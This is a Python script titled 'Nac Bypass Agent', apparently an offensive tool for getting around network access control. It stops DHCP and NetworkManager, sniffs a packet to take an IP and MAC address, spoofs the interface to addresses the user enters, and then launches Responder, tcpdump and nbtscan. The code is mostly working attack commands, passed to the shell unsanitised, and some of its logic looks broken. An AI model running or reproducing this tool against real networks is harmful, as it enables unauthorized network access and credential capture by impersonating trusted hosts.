import os
import subprocess
import re

# Color print functions
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))
def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk))
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk))
def prBlack(skk): print("\033[98m {}\033[00m" .format(skk))

prCyan('''
                                _                 ___  
                               | |               / _ \ 
  _ __ ___     ___  __      __ | |_  __      __ | | | -|
 | '_ ` _ \   / _ \ \ \ /\ / / | __| \ \ /\ / / | | |----|
 | | | | | | |  __/  \ V  V /  | |_   \ V  V /  | |_| --|
 |_| |_| |_|  \___|   \_/\_/    \__|   \_/\_/    \___/ 
                                                       
                                                                                                                         

				 _                 
				//\lperen  |U|gurlu
                   `-'     

                      
''' )

prRed('''''''''''''''

	     Nac Bypass Agent
         *    *      * * *  *   *  
        * *    ******          * * 
           **         *   ** **   *
                         *         
                      *   ** **    
        *     *                   *
           *    *   *          *   
          *            *    *   ** 
               *   *               
            *    *                 
                                   
         *        *  *             


''''''''''''''')


def run_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    return output.decode(), error.decode()

def kill_network_services():
    run_command("pkill dhclient")
    run_command("dhclient -r")
    run_command("pkill NetworkManager")

def get_network_info():
    output, error = run_command("tcpdump -c 1 -n -l")
    ip_addresses = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', output)
    mac_addresses = re.findall(r'(?:[0-9a-fA-F]:?){12}', output)

    if not ip_addresses or not mac_addresses:
        print("Unable to detect IP address or MAC address.")
        return None, None

    return ip_addresses[0], mac_addresses[0]


def spoof_ip_address(interface, ip_address, netmask):
    run_command(f"ifconfig {interface} {ip_address} netmask {netmask}")

def spoof_mac_address(interface, mac_address):
    run_command(f"ifconfig {interface} hw ether {mac_address}")

def start_responder(interface):
    run_command(f"responder -A {interface}")

def start_tcpdump(interface):
    run_command(f"tcpdump -i {interface}")

def nbtscan(ip_range):
    run_command(f"nbtscan -r {ip_range}")

def main():
    kill_network_services()
    ip_address, mac_address = get_network_info()
    print(f"Detected IP address: {ip_address}")
    print(f"Detected MAC address: {mac_address}")

    interface = input("Enter interface: ")
    ip_address_to_spoof = input("Enter IP address to spoof: ")
    netmask = input("Enter netmask: ")
    spoof_ip_address(interface, ip_address_to_spoof, netmask)

    mac_address_to_spoof = input("Enter MAC address to spoof: ")
    spoof_mac_address(interface, mac_address_to_spoof)

    start_responder(interface)
    start_tcpdump(interface)
    
    ip_range = input("Enter IP range for nbtscan: ")
    nbtscan(ip_range)

if __name__ == "__main__":
    main()
